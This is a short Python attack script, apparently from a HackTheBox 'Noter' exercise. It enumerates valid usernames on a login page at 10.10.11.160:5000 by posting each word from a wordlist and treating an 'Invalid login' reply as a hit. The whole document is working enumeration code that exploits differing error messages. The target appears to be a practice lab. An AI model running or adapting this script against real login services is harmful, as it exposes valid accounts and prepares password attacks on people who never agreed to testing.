#!/usr/bin/env python

import requests

target_url = "http://10.10.11.160:5000/login"

data_dict = {"username": "admisn" , "password":"asd"}
response = requests.post(target_url, data=data_dict)

print(response.content)


with open("/media/abhishekmorla/Abhishek/abhishek/Desktop/hackthebox/noter/passwords.txt","r") as wf:
	for line in wf:
		word = line.strip()
		data_dict["username"] = word #as its dictionary we can replace the content by doing this.
		response = requests.post(target_url, data=data_dict)
		if "Invalid login" in response.content: # to check according to the functionality how does this behave
			print("+ got the username -->" + word)

print("Reached eol")
